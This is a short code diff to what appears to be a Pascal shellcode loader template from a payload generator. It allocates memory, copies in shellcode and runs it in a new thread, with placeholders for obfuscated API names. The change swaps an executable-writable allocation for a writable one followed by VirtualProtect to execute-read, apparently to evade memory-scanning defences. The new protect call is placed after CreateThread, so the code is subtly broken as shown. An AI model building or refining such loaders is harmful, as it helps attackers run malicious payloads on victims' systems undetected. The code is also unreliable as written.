@@ -19,15 +19,18 @@ var
     hThread: Handle;
     addr: Pointer;
     ThreadId: LongWord;
+    oldProtect: LongWord;
 
 begin
     
     {transformers}
 
-    addr := {VirtualAlloc}(nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    addr := {VirtualAlloc}(nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE);
 
     CopyMemory(addr,shellcode,{shellcodeSize});
     hThread := {CreateThread}(nil, 0, addr, nil, 0, ThreadId);
+
+    {VirtualProtect}(addr, {shellcodeSize}, PAGE_EXECUTE_READ, oldProtect);
 
     {WaitForSingleObject}(hThread, INFINITE);
     {CloseHandle}(hThread);
